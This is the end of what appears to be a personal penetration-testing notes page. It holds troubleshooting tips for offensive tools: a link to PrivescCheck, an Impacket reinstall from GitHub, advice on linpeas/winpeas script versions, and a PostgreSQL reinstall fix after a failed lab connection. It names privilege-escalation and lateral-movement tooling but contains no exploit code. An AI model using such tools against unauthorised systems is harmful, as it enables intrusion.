<p><a href="https://github.com/itm4n/PrivescCheck">https://github.com/itm4n/PrivescCheck</a></p>

<h2 id="troubleshooting">TroubleShooting</h2>

<h3 id="impacket">Impacket</h3>

<p>Impacket tools doesn’t function right</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">git</span> <span class="nx">clone</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/fortra/impacket</span>
<span class="nx">python3</span> <span class="o">-</span><span class="nx">m</span> <span class="nx">pip</span> <span class="nx">install</span> <span class="p">.</span>
</code></pre></div></div>

<h3 id="linpeass--winpeass">Linpeass / Winpeass</h3>

<p>if binary version of linpeass/winpeass doesn’t work right, try to use .sh/.bat instead.</p>

<h3 id="postgresql-1">Postgresql</h3>

<p>Postgresql connection error (incompatible with openssl 3.2): purge and reinstall</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">psql</span><span class="p">:</span> <span class="nx">error</span><span class="p">:</span> <span class="nx">connection</span> <span class="nx">to</span> <span class="nx">server</span> <span class="nx">at</span> <span class="dl">"</span><span class="s2">192.168.165.47</span><span class="dl">"</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">5437</span> <span class="nx">failed</span><span class="p">:</span> <span class="nx">FATAL</span><span class="p">:</span>  <span class="nx">no</span> <span class="nx">PostgreSQL</span> <span class="nx">user</span> <span class="nx">name</span> <span class="nx">specified</span> <span class="k">in</span> <span class="nx">startup</span> <span class="nx">packet</span>
<span class="nx">connection</span> <span class="nx">to</span> <span class="nx">server</span> <span class="nx">at</span> <span class="dl">"</span><span class="s2">192.168.165.47</span><span class="dl">"</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">5437</span> <span class="nx">failed</span><span class="p">:</span> <span class="nx">FATAL</span><span class="p">:</span>  <span class="nx">no</span> <span class="nx">PostgreSQL</span> <span class="nx">user</span> <span class="nx">name</span> <span class="nx">specified</span> <span class="k">in</span> <span class="nx">startup</span> <span class="nx">packet</span>
<span class="nx">double</span> <span class="nx">free</span> <span class="nx">or</span> <span class="nx">corruption</span> <span class="p">(</span><span class="nx">out</span><span class="p">)</span>
<span class="nx">zsh</span><span class="p">:</span> <span class="nx">IOT</span> <span class="nx">instruction</span>  <span class="nx">psql</span> <span class="o">-</span><span class="nx">h</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">165.47</span> <span class="o">-</span><span class="nx">U</span> <span class="nx">postgres</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">5437</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">postgres</span>

<span class="nx">sudo</span> <span class="nx">apt</span><span class="o">-</span><span class="kd">get</span> <span class="nx">purge</span> <span class="nx">postgresql</span> <span class="dl">'</span><span class="s1">postgresql-*</span><span class="dl">'</span> <span class="o">-</span><span class="nx">y</span>
<span class="nx">sudo</span> <span class="nx">apt</span><span class="o">-</span><span class="kd">get</span> <span class="nx">install</span> <span class="nx">postgresql</span><span class="o">-</span><span class="mi">16</span>
</code></pre></div></div>

</article>
      </section>
    </div>
  </div>

   <footer>
  <a href="https://xxxinhy.github.io/">
    <span>
        <b>Xinyue</b>
    </span>
    
    <span>© 2024</span>
  </a>
</footer>

  
</body>

</html>